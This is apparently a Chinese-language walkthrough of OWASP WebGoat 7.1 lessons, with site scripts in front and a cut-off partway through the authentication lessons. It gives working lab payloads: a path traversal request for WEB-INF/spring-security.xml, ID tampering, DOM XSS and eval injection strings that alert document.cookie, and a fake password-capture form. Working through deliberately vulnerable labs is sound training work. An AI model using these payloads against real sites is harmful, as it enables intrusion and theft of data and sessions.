@@ -1,0 +1,1067 @@
+<head> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> </head><script src="static/js/header/jquery.min.js?ver=3.6.1" type="text/javascript"></script>
+<script src="static/buf/plugins/wp-favorite-posts/wpfp.js?ver=3.6.1" type="text/javascript"></script>
+<script src="static/js/highslide/highslide-with-html.packed.js" type="text/javascript"></script>
+<script type="text/javascript">
+jQuery(document).ready(function($) {
+    hs.graphicsDir = "static/buf/plugins/auto-highslide/images/graphics/";
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.addSlideshow({
+        interval: 5000,
+        repeat: true,
+        useControls: true,
+        fixedControls: "fit",
+        overlayOptions: {
+            opacity: 0.75,
+            position: "bottom center",
+            hideOnMouseOut: true
+
+        }
+
+    });
+});
+</script>
+<script language="JavaScript" src="static/buf/plugins/cartpauj-pm/js/script.js" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/layer.js"></script>
+<script src="static/buf/plugins/simditor/highlight/highlight.pack.js" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/jquery-2.0.3.min.js"></script>
+<script src="static/buf/themes/freebuf/js/bootstrap.min.js"></script>
+<script src="static/buf/themes/freebuf/js/slider.js?2016022501.1" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/jquery.sticky.js" type="text/javascript"></script>
+<script src="static/js/focus/bjqs-1.3.min.js" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/mosaic.1.0.1.min.js" type="text/javascript"></script>
+<script src="static/js/new/setint.js" type="text/javascript"></script>
+<script src="static/js/colum/swiper-3.4.2.min.js"></script>
+<script type="application/ecmascript">
+    $('.icon-wechat').hover(function(){
+        $('.wechatImgdiv').show()
+    },function(){
+        $('.wechatImgdiv').hide()
+    })
+</script>
+<script src="static/js/header/header.js" type="text/javascript"></script>
+<script>
+		jQuery(window).load(function () {
+			jQuery(".main-header").sticky({topSpacing: 0});
+		});
+	</script>
+<script>
+                    $('.user-detial .test-info').mouseover(function() {
+                        var _title = $(this).find('.text').attr('data-title');
+                        if (_title) {
+                            var str = '<span class="text-title">' + _title + '</span>';
+                            $(this).append(str);
+                        }
+                    }).mouseout(function() {
+                        $('.user-detial .test-info .text-title').remove();
+                    });
+                </script>
+<script type="text/javascript">
+				jQuery("#pagination a").live("click", function () {
+					var _url = jQuery(this).attr("href");
+					jQuery(this).parents("li").addClass("current").blur().parents("#menupage").find("li").not(jQuery(this).parents("li")).removeClass("current");
+					jQuery.ajax({
+						type: "POST",
+						url: _url + "#timeline",
+						success: function (data) {
+							result = jQuery(data).find("#timeline .news_inner");
+							nextHref = jQuery(data).find("#pagination a").attr("href");
+							if (nextHref != undefined) {
+								jQuery("#pagination a").attr("href", nextHref);
+							} else {
+								jQuery("#pagination").remove();
+							}
+							jQuery(function () {
+								if (_url.indexOf("page") < 1) {
+									jQuery("#timeline").html('');
+								}
+								jQuery("#timeline").append(result.fadeIn(200));
+							});
+						}
+					});
+					return false;
+				});
+			</script>
+<script>
+    $('.star_score > a').click(function() {
+        $(this).addClass('active');
+        $(this).siblings().removeClass('active');
+    });
+    $('.star_score > a').hover(function() {
+        $(this).siblings().removeClass('active');
+    });
+    $(document).on('click', function() {
+        $('.bottom_tools .tips-wrap').hide(500);
+    });
+    $('.bottom_tools ul li.fb-tips').click(function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $(this).find('.tips-wrap').toggle(500);
+    });
+    $('.bottom_tools .tips-wrap').click(function(event) {
+        var evt = evt || event;
+        evt.stopPropagation();
+        $(this).show();
+    });
+    $('.feedback').on('click',function () {
+        var content = $('#feedback-content').val();
+        if(!content){
+            $('#feedback-content').focus();
+            $('.feedback-error').text('反馈内容不能为空！').show();
+            return;
+        }
+        var contact = $('#feedback-contact').val();
+        if(!contact){
+            $('#feedback-contact').focus();
+            $('.feedback-error').text('联系方式不能为空！').show();
+            return;
+        }
+        var score = $('.star_score').children('.active').attr('data-id')
+        if(!score){
+            $('.feedback-error').text('给FreeBuf打个分吧！').show();
+            return;
+        }
+        var yzm = $('#yzm').val();
+        var _url = 'static/verify';
+        $.ajax({
+            type: "post",
+            url: _url,
+            data: {'content':content,'contact':contact,'score':score,'feedback_status':1,'yzm':yzm},
+            success: function (data) {
+                $("#captcha").trigger('click')
+                if(data.code ==200){
+                    layer.open({
+                        title: '系统提示',
+                        btnAlign: 'c',
+                        content: data.msg,
+                        area: '278px',
+                    });
+                }else {
+                    layer.open({
+                        title: '系统提示',
+                        btnAlign: 'c',
+                        content: data.msg,
+                        area: '278px',
+                    });
+                }
+            },
+        })
+    })
+
+    $(document).on('click', '.appeal-wrap-public .appeal-main', function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $('.appeal-wrap-public').show();
+    });
+    $(document).on('click', '.appeal-main .close', function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $('.appeal-wrap').hide();
+    });
+    $(document).on('click', '.appeal-main .appeal-footer .btn-sure', function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $('.appeal-wrap-public').hide();
+    });
+
+    $('.complain').on('click',function () {
+        var _url = 'static/verify';
+        var token = $('#complain_token').val();
+        $.ajax({
+            type: "post",
+            url: _url,
+            data: {'complain_token':token,'complain_status':1},
+            success: function (data) {
+            },
+        })
+    })
+</script>
+<script src="static/js/new/backtop.js"></script>
+<script type="text/javascript">
+jQuery(function(){	
+	jQuery('.tabPanes ul li').click(function(){
+		jQuery(this).addClass('hit').siblings().removeClass('hit');
+		jQuery('.panesl>div:eq('+jQuery(this).index()+')').show().siblings().hide();	
+	})
+	jQuery('.vulbox-nav').click(function(e) { 
+        e.stopPropagation(); 
+    });  
+})
+</script>
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fcc53db168808048541c6735ce30421f5' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+jQuery(function() {
+    jQuery(".simditor pre").each(function(i, block){
+        hljs.highlightBlock(block);    
+    });
+    hljs.initHighlightingOnLoad();
+});
+</script>
+<script>
+/* <![CDATA[ */
+var rcGlobal = {
+	serverUrl		:'static',
+	infoTemp		:'%REVIEWER% on %POST%',
+	loadingText		:'Loading',
+	noCommentsText	:'No comments',
+	newestText		:'&laquo; 最新',
+	newerText		:'&laquo; 新一点',
+	olderText		:'旧一点 &raquo;',
+	showContent		:'1',
+	external		:'1',
+	avatarSize		:'32',
+	avatarPosition	:'left',
+	anonymous		:'Anonymous'
+};
+/* ]]> */
+</script>
+<script src="static/js/recentcomments/wp-recentcomments-jquery.js?ver=2.2.3" type="text/javascript"></script>
+
+<link href="static/buf/plugins/wp-favorite-posts/wpfp.css" id="wpfp-css" rel="stylesheet" type="text/css"/>
+<link href="static/css/recentcomments/wp-recentcomments.css?ver=2.2.3" id="wp-recentcomments-css" media="screen" rel="stylesheet" type="text/css"/>
+<link href="static/buf/plugins/gold/assets/css/widget.css?ver=1.3.2.1" id="mycred-widget-css" media="all" rel="stylesheet" type="text/css"/>
+<link href="static/css/highslide/highslide.css" rel="stylesheet" type="text/css"/>
+<link href="static/buf/plugins/cartpauj-pm/style/style.css" rel="stylesheet" type="text/css"/>
+<link href=" static/buf/plugins/simditor/highlight/styles/default.css" rel="stylesheet" type="text/css"/>
+<link href="https://static.freebuf.com/images/favicon.ico" rel="shortcut icon"/>
+<link href="static/css/new/header.css" rel="stylesheet"/>
+<link href="static/css/new/bootstrap.min.css?ver=2016051701" media="screen" rel="stylesheet"/>
+<link href="static/css/new/swiper-3.4.2.min.css" rel="stylesheet" type="text/css"/>
+<link href="static/css/new/style.css?ver=2018112123749359438534" rel="stylesheet" type="text/css"/>
+
+<div id="contenttxt">
+                            <p><span style="color:rgb(0,0,0);font-size:24px;">安装</span>    </p>
+<p><code><span style="font-size:12pt;color:rgb(51,51,51);">docker pull webgoat/webgoat-7.1</span></code><span style="color:rgb(85,85,85);"><br /></span><code><span style="font-size:12pt;color:rgb(51,51,51);">docker run -p 8080:8080 -t webgoat/webgoat-7.1</span></code></p>
+<p><code><span style="font-size:12pt;color:rgb(51,51,51);">网站：</span></code><code><span style="font-size:12pt;color:rgb(51,51,51);"><a href="http://ip:8080/WebGoat/login.mvc">http://IP:8080/WebGoat/login.mvc</a></span></code></p>
+<p>如果想要进去docker容器，docker ps查看容器，然后docker exec –it 容器ID /bin/bash</p>
+<h1>General</h1>
+<h2>Http Basics（HTTP基础）</h2>
+<p>该选项是显示HTTP数据包的内容，使用burpsuit代理抓取数据包，我在EnterYourName输入1，下面数据包person参数接收1。</p>
+</p>
+<pre><code>POST/WebGoat/attack?Screen=1869022003&amp;menu=100 HTTP/1.1
+
+Host: 223.168.1.128:8000
+
+User-Agent: Mozilla/5.0 (Windows NT 6.1;WOW64; rv:54.0) Gecko/20100101 Firefox/54.0
+
+Accept: */*
+
+Accept-Language:zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+
+X-Requested-With: XMLHttpRequest
+
+Referer:http://223.168.1.128:8000/WebGoat/start.mvc
+
+Content-Length: 19
+
+Cookie:JSESSIONID=9CC338A02AEA2ADCB44302FDB691BB09
+
+Connection: close
+
+ 
+
+person=1&amp;SUBMIT=Go<br /></code></pre>
+<p></p>
+<p><span style="font-size:10.5pt;"></span></p>
+<p></p>
+<div class="simditor-table">
+<div class="simditor-resize-handle"></div>
+</div>
+<h1>Access Control Flaws（访问控制缺陷）</h1>
+<h2>Using an Access Control Matrix（使用访问控制矩阵）</h2>
+<p>在基于角色的访问控制方案中，角色表示一组访问权限和权限。用户可以被分配一个或多个角色。基于角色的访问控制方案通常由角色权限管理和角色分配两部分组成。基于角色的访问控制方案可能允许用户执行他/她分配的角色不允许的访问，或以某种方式允许向未授权角色提升权限。</p>
+<p><b> </b></p>
+<p><b>一般目标：</b></p>
+<p>每个用户都是允许访问某些资源的角色的成员。您的目标是<b>探索管理此网站的访问控制规则。</b>只有[Admin]组才能访问“Account Manager”资源。</p>
+<p>示范如下：</p>
+<p>MOE用户不允许访问该组</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068452908704.png" src="images/20171001/15068452908704.png" width="554" height="142" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068452908704.png" width="554" height="142" /></p></noscript>
+<p>Larry允许访问该组，左上角打钩代表课程完成。</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/1506845306263.png" src="images/20171001/1506845306263.png" width="554" height="239" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/1506845306263.png" width="554" height="239" /></p></noscript>
+<h2>Bypass a Path Based Access Control Scheme（绕过路径访问控制方案）</h2>
+<p>&#8216;webgoat&#8217;用户可以访问lessonPlans/en目录中的所有文件。 尝试破坏访问控制机制并访问不在列出的目录中的资源。 选择要查看的文件后，WebGoat将报告是否授予对文件的访问权限。 尝试获取的有趣文件可能是像WEB-INF/spring-security.xml这样的文件。 请记住，文件路径将根据WebGoat的启动方式而有所不同。</p>
+<p>当前路径：</p>
+<p>/.extract/webapps/WebGoat/plugin_extracted/plugin/BlindStringSqlInjection/lessonPlans/en/BlindStringSqlInjection.html</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068453277245.png" src="images/20171001/15068453277245.png" width="554" height="349" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068453277245.png" width="554" height="349" /></p></noscript>
+<p>现在我们要获取WEB-INF/spring-security.xml文件的内容。首先说一下../代表上一级目录，其次我们要找到文件的路径，最后更改文件路径。</p>
+<p>操作如下，使用burpsuit修改File参数的内容：</p>
+<div class="simditor-table">
+<div class="simditor-resize-handle"></div>
+</div>
+<pre><code>POST/WebGoat/attack?Screen=231255157&amp;menu=200 HTTP/1.1
+
+Host: 223.168.1.128:8000
+
+User-Agent: Mozilla/5.0 (Windows NT 6.1;WOW64; rv:54.0) Gecko/20100101 Firefox/54.0
+
+Accept: */*
+
+Accept-Language:zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+
+Accept-Encoding: gzip, deflate
+
+Content-Type:application/x-www-form-urlencoded; charset=UTF-8
+
+X-Requested-With: XMLHttpRequest
+
+Referer:http://223.168.1.128:8000/WebGoat/start.mvc
+
+Content-Length: 64
+
+Cookie:JSESSIONID=9CC338A02AEA2ADCB44302FDB691BB09
+
+Connection: close
+
+ 
+
+File=../../../../../WEB-INF/spring-security.xml&amp;SUBMIT=View+File</code></pre>
+<p> </p>
+<p></p>
+<p><span style="font-size:10.5pt;"></span></p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068453872627.png" src="images/20171001/15068453872627.png" width="554" height="201" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068453872627.png" width="554" height="201" /></p></noscript>
+<p> </p>
+<h2>LAB: Role Based Access Control（基于角色的访问控制）</h2>
+<p>该类型分四个阶段，故而在下面阶段演示。</p>
+<h2>Stage 1: Bypass Business Layer Access Control（阶段1：绕过业务层访问控制）</h2>
+<p>作为普通员工“tom”，利用弱访问控制来使用“职员列表”页面中的“删除”功能。验证可以删除汤姆的个人资料。用户的密码是小写的给定名称（例如Tom Cat的密码是“tom”）。</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/1506845402782.png" src="images/20171001/1506845402782.png" width="554" height="204" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/1506845402782.png" width="554" height="204" /></p></noscript>
+<p>登录进去之后，对ViewProfile按钮进行抓包</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068454095086.png" src="images/20171001/15068454095086.png" width="554" height="191" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068454095086.png" width="554" height="191" /></p></noscript>
+<p>修改action参数的内容为DeleteProfile，然后发送数据包即可。</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/1506845415711.png" src="images/20171001/1506845415711.png" width="554" height="200" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/1506845415711.png" width="554" height="200" /></p></noscript>
+<h2>Stage 2: Add Business Layer Access Control.</h2>
+<p><b>本课程仅与WEBGOAT</b><b>的开发者版本协调工作</b></p>
+<p>执行修复以拒绝未经授权的访问删除功能。为此，您必须更改WebGoat代码。完成此操作后，重复第1步，并验证是否正确地拒绝对DeleteProfile功能的访问。</p>
+<p>进入docker容器</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/1506845437898.png" src="images/20171001/1506845437898.png" width="554" height="56" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/1506845437898.png" width="554" height="56" /></p></noscript>
+<p>查看代码</p>
+<p></p>
+<p>因为本人不熟悉Java代码，所以这一部分跳过。</p>
+<h2>Stage 3: Breaking Data LayerAccess Control（阶段3：打破数据层访问控制）</h2>
+<p><b>目标</b>：作为普通员工“tom”，利用弱访问控制来查看其他员工的个人资料。 </p>
+<p>使用tom用户登录</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068454774156.png" src="images/20171001/15068454774156.png" width="554" height="270" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068454774156.png" width="554" height="270" /></p></noscript>
+<p>对viewprofile按钮进行抓包，105是tom的ID号，而Larry的ID号为101，修改ID为101</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068454885474.png" src="images/20171001/15068454885474.png" width="554" height="237" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068454885474.png" width="554" height="237" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068454999735.png" src="images/20171001/15068454999735.png" width="554" height="298" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068454999735.png" width="554" height="298" /></p></noscript>
+<h2>Stage 4: Add Data Layer Access Control.（阶段4：添加数据层访问控制。）略</h2>
+<h1>AJAX Security</h1>
+<h2>DOM Injection</h2>
+<p>*您的受害者是一个系统，需要一个激活密钥才能使用它。</p>
+<p>*您的目标应该是尝试启用激活按钮。</p>
+<p>*请花一些时间查看HTML源码，以了解关键验证过程的工作原理。</p>
+<p>使用调试器，找到activate按钮的源代码，将disable=“”这一段删除，然后按钮启用，点击按钮即可。</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068455557287.png" src="images/20171001/15068455557287.png" width="554" height="225" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068455557287.png" width="554" height="225" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068455627264.png" src="images/20171001/15068455627264.png" width="554" height="201" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068455627264.png" width="554" height="201" /></p></noscript>
+<h2>LAB: DOM-Based cross-site scripting</h2>
+<p>阶段1：对于本练习，您的任务是使用以下位置的图像对本网站进行描述：OWASP IMAGE</p>
+<p>在输入框输入&lt;img src=&#8221;images/logos/owasp.jpg&#8221; /&gt;，点击按钮</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068455683386.png" src="images/20171001/15068455683386.png" width="554" height="149" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068455683386.png" width="554" height="149" /></p></noscript>
+<p>STAGE 2：现在，尝试使用image标签创建JavaScript警报</p>
+<p>在输入框输入&lt;img src=test onerror=&#8221;alert(&#8216;this is xss test&#8217;)&#8221;&gt;，点击按钮即可</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068455868155.png" src="images/20171001/15068455868155.png" width="554" height="146" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068455868155.png" width="554" height="146" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068455928849.png" src="images/20171001/15068455928849.png" width="554" height="182" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068455928849.png" width="554" height="182" /></p></noscript>
+<p>阶段3：接下来，尝试使用IFRAME标签创建JavaScript警报。</p>
+<p>在输入框输入&lt;iframe src=javascript:alert(0)&gt;&lt;/iframe&gt;，点击按钮即可</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068456016058.png" src="images/20171001/15068456016058.png" width="554" height="195" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068456016058.png" width="554" height="195" /></p></noscript>
+<p>阶段4：使用以下命令创建假登录表单：</p>
+</p>
+<pre><code>Hello, Please enter your password :&lt;BR&gt;&lt;inputtype = "password" name="pass"/&gt;&lt;buttononClick="javascript:alert('I have your password:'+pass.value);"&gt;Submit&lt;/button&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;</code></pre>
+</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068456085305.png" src="images/20171001/15068456085305.png" width="554" height="219" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068456085305.png" width="554" height="219" /></p></noscript>
+<p>阶段5：执行客户端HTML实体编码以减轻DOM XSS漏洞。在escape.js中为您提供了一种实用方法。</p>
+<p>进入docker容器</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068456186877.png" src="images/20171001/15068456186877.png" width="554" height="153" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068456186877.png" width="554" height="153" /></p></noscript>
+<p>修改DOMXSS.js，在name加上escapeHTML（），即escapeHTML(name),然后保存即可。</p>
+<h2>LAB: Client Side Filtering（LAB：客户端过滤）</h2>
+<p>阶段1：您以山羊山金融公司（CSO）Moe Stooge的身份登录。您可以访问公司信息中的每个人，除了CEO，内维尔巴塞洛缪。或者至少你不应该访问CEO的信息。对于此练习，请检查页面的内容，以查看可以找到的额外信息。</p>
+<p>使用调试器，找到Bartholomew，输入450000</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068456278630.png" src="images/20171001/15068456278630.png" width="554" height="249" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068456278630.png" width="554" height="249" /></p></noscript>
+<p>阶段2：现在，解决问题。修改服务器只返回可以看到Mustache的结果。</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068456375135.png" src="images/20171001/15068456375135.png" width="554" height="93" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068456375135.png" width="554" height="93" /></p></noscript>
+<p>刷新网页，点击Click here when you believe you have completed the lesson.按钮</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068456577346.png" src="images/20171001/15068456577346.png" width="554" height="217" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068456577346.png" width="554" height="217" /></p></noscript>
+<h2>XML Injection</h2>
+<p>WebGoat-Miles奖励里程显示所有可用的奖励。 输入帐户号码后，课程将显示您的余额和您负担得起的产品。 您的目标是尝试为您所允许的一套奖励增加更多奖励。 您的帐户ID是836239。</p>
+<p>在输入框输入836239</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068456663646.png" src="images/20171001/15068456663646.png" width="554" height="226" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068456663646.png" width="554" height="226" /></p></noscript>
+<p>使用调试器找到勾选框所在的源代码，添加两个&lt;tr&gt;,然后将所有框都打上勾</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068456712083.png" src="images/20171001/15068456712083.png" width="554" height="281" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068456712083.png" width="554" height="281" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068456821750.png" src="images/20171001/15068456821750.png" width="554" height="180" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068456821750.png" width="554" height="180" /></p></noscript>
+<h2>JSON Injection</h2>
+<p>*您从波士顿，MA-机场代码BOS到西雅图，WA &#8211; 机场代码SEA。</p>
+<p>*输入机场的三位数代码后，将会执行一个AJAX请求，询问机票价格。</p>
+<p>*你会注意到有两个航班可用，一个昂贵的一个没有停止，另一个便宜的一个有2站。</p>
+<p>*你的目标是试图要一个没有停止，但更便宜的价格。</p>
+<p>正常是这样</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068456944093.png" src="images/20171001/15068456944093.png" width="554" height="186" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068456944093.png" width="554" height="186" /></p></noscript>
+<p>使用burpsuit抓取，并显示响应包</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068457003247.png" src="images/20171001/15068457003247.png" width="554" height="318" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068457003247.png" width="554" height="318" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068457067563.png" src="images/20171001/15068457067563.png" width="554" height="318" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068457067563.png" width="554" height="318" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/1506845712696.png" src="images/20171001/1506845712696.png" width="554" height="205" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/1506845712696.png" width="554" height="205" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068457203502.png" src="images/20171001/15068457203502.png" width="554" height="239" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068457203502.png" width="554" height="239" /></p></noscript>
+<p>还有另外一种思路，直接改最后的数据包</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068457276502.png" src="images/20171001/15068457276502.png" width="554" height="318" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068457276502.png" width="554" height="318" /></p></noscript>
+<h2>Silent Transactions Attacks（静默交易攻击）</h2>
+<p>*这是一个示例的网上银行应用程序 &#8211; 汇款页面。</p>
+<p>*显示在您的余额之下，您转移的账户和您将转账的金额。</p>
+<p>*应用程序使用AJAX在进行一些基本的客户端验证后提交交易。</p>
+<p>*您的目标是尝试绕过用户的授权，并以静默方式执行交易。</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068457375295.png" src="images/20171001/15068457375295.png" width="554" height="175" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068457375295.png" width="554" height="175" /></p></noscript>
+<p>在调试器输入javascript:submitData(12345,11111111111)</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068457458716.png" src="images/20171001/15068457458716.png" width="554" height="235" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068457458716.png" width="554" height="235" /></p></noscript>
+<h2>Insecure Client Storage（不安全的客户端存储）</h2>
+<p>阶段1：对于此练习，您的任务是发现优惠券代码以获得意想不到的折扣。</p>
+<p>使用firebug对js进行调试，发现优惠价代码：PRESSTWO</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068457531021.png" src="images/20171001/15068457531021.png" width="554" height="280" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068457531021.png" width="554" height="280" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068457584308.png" src="images/20171001/15068457584308.png" width="554" height="440" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068457584308.png" width="554" height="440" /></p></noscript>
+<p>阶段2：现在，尝试免费获得整个订单。</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068457635559.png" src="images/20171001/15068457635559.png" width="554" height="319" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068457635559.png" width="554" height="319" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068457683266.png" src="images/20171001/15068457683266.png" width="554" height="366" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068457683266.png" width="554" height="366" /></p></noscript>
+<h2>Dangerous Use of Eval</h2>
+<p>对于这个练习，你的任务是提出一些包含脚本的输入。您必须尝试将此页面反映回您的浏览器，这将执行脚本。为了通过本课程，您必须&#8217;alert（）&#8217;document.cookie。</p>
+<p>在输入框输入123&#8242;)%3Balert(document.cookie)%3B(&#8216;</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/1506845778103.png" src="images/20171001/1506845778103.png" width="554" height="321" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/1506845778103.png" width="554" height="321" /></p></noscript>
+<h2>Same Origin Policy Protection</h2>
+<p>本演示演示了同源政策保护。 XHR请求只能被传回给始发服务器。尝试将数据传递到非始发服务器将失败。</p>
+<p>输入网址：/WebGoat/plugin_extracted/plugin/SameOriginPolicyProtection/jsp/sameOrigin.jsp</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068457884537.png" src="images/20171001/15068457884537.png" width="554" height="198" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068457884537.png" width="554" height="198" /></p></noscript>
+<p>输入网址：<a href="http://www.google.com/search?q=aspect+security">http://www.google.com/search?q=aspect+security</a></p>
+<p>This exercise demonstrates the Same OriginPolicy Protection.  XHR requests can onlybe passed back to  the originatingserver.  Attempts to pass data to anon-originating server  will fail.（本演示演示了同源政策保护。 XHR请求只能被传回给始发服务器。尝试将数据传递到非始发服务器将失败。）</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068458082320.png" src="images/20171001/15068458082320.png" width="554" height="187" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068458082320.png" width="554" height="187" /></p></noscript>
+<h1>Authentication Flaws（认证漏洞）</h1>
+<h2>Password Strength（密码强度）</h2>
+<p>您的Web应用程序的帐户与密码一样安全。对于此练习，您的工作是在<a href="https://howsecureismypassword.net">https://howsecureismypassword.net</a>上测试多个密码。 您必须同时测试所有6个密码&#8230;</p>
+<p>在你的应用程序你应该设置好的密码要求！</p>
+<p>桌面电脑需要多少时间来破解这些密码？</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068458338872.png" src="images/20171001/15068458338872.png" width="554" height="112" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068458338872.png" width="554" height="112" /></p></noscript>
+<h2>Forgot Password（忘记密码）</h2>
+<p>Web应用程序经常为用户提供检索忘记密码的能力。 不幸的是，许多Web应用程序无法正确实现机制。 验证用户身份所需的信息往往过于简单。</p>
+<p>一般目标：</p>
+<p>如果用户可以正确回答这个秘密问题，用户可以检索密码。这个“忘记密码”页面上没有锁定机制。您的用户名是“webgoat”，您最喜欢的颜色是“红色”。目标是检索另一个用户的密码。</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068458435943.png" src="images/20171001/15068458435943.png" width="554" height="228" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068458435943.png" width="554" height="228" /></p></noscript>
+<p>我检索admin用户</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/1506845850611.png" src="images/20171001/1506845850611.png" width="554" height="191" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/1506845850611.png" width="554" height="191" /></p></noscript>
+<h2>Multi Level Login 1</h2>
+<p>阶段1：这个阶段只是为了展示一个经典的多登录是如何工作的。您的目标是通过用户Jane和密码tarzan进行常规登录。您有以下TAN：</p>
+<p>Tan＃1 = 15648</p>
+<p>Tan＃2 = 92156</p>
+<p>Tan＃3 = 4879</p>
+<p>Tan＃4 = 9458</p>
